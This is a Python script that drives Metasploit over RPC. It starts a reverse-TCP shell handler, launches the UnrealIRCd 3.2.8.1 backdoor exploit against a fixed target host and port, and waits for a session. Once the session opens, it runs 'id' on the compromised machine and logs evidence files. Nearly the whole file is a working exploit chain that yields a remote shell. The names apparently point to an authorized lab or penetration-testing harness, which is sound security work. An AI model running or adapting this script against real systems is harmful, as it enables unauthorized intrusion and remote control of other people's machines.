#!/usr/bin/env python3
"""IRC reverse shell attack with handler."""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

TARGET = "10.255.255.254"
IRC_PORT = 9667
LPORT = 4444
ENGAGEMENT = "lab-default"
EVIDENCE = ROOT / "evidence" / "msf"
EVIDENCE.mkdir(parents=True, exist_ok=True)


def get_wsl_ip() -> str:
    import subprocess
    r = subprocess.run(
        ["wsl", "-e", "bash", "-lc", "ip -4 addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | head -1"],
        capture_output=True, text=True, timeout=10,
    )
    ip = r.stdout.strip()
    return ip or "127.0.0.1"


def save(name: str, data: dict) -> None:
    path = EVIDENCE / f"mvp-{name}.json"
    path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
    print(f"  [evidence] {path.name}")


def main() -> int:
    from msf_harness.mcp.rpc.client import get_rpc, reset_client

    reset_client()
    client = get_rpc()
    lhost = get_wsl_ip()
    print(f"=== LHOST (WSL): {lhost} ===")

    # Start handler
    print(f"\n=== Starting handler on {lhost}:{LPORT} ===")
    handler = client.modules.use("exploit", "multi/handler")
    handler["PAYLOAD"] = "linux/x86/shell/reverse_tcp"
    handler["LHOST"] = lhost
    handler["LPORT"] = str(LPORT)
    hjob = handler.execute()
    print("  handler job:", hjob)
    save("handler", {"lhost": lhost, "lport": LPORT, "job": hjob})
    time.sleep(2)

    # IRC exploit
    print(f"\n=== IRC backdoor exploit {TARGET}:{IRC_PORT} ===")
    mod = client.modules.use("exploit", "unix/irc/unreal_ircd_3281_backdoor")
    mod["RHOSTS"] = TARGET
    mod["RPORT"] = str(IRC_PORT)
    mod["PAYLOAD"] = "linux/x86/shell/reverse_tcp"
    mod["LHOST"] = lhost
    mod["LPORT"] = str(LPORT)
    result = mod.execute()
    print("  exploit job:", result)
    save("irc-exploit", {"result": result, "target": TARGET, "port": IRC_PORT})

    # Wait for session
    print("\n=== Waiting for session (60s) ===")
    for i in range(30):
        time.sleep(2)
        sessions = client.sessions.list
        if isinstance(sessions, dict) and sessions:
            sid = int(list(sessions.keys())[0])
            print(f"  SESSION {sid}:", sessions[sid])
            client.call("session.shell_write", [sid, "id\n"])
            time.sleep(3)
            out = client.call("session.shell_read", [sid])
            print("  id output:", out.get("data", ""))
            save("irc-session", {"session_id": sid, "output": out, "sessions": sessions})
            print("\n*** MVP SUCCESS: reverse shell obtained ***")
            return 0
        print(f"  ... waiting ({(i+1)*2}s)")

    print("\n=== No session - check portproxy or try bind shell on 6200 ===")
    save("irc-no-session", {"sessions": client.sessions.list})
    return 1


if __name__ == "__main__":
    sys.exit(main())
